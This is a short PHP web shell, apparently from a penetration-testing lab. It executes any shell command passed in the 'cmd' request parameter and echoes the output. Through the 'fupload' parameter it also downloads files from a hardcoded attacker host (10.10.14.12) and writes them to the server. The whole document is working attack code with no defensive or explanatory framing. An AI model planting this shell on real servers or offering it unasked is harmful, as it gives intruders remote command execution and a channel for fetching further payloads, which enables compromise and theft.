<?php
if (isset($_REQUEST['fupload']))
{
	file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.12/" . $_REQUEST['fupload']));
};
if (isset($_REQUEST['cmd']))
{
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "<pre>";
}
?>
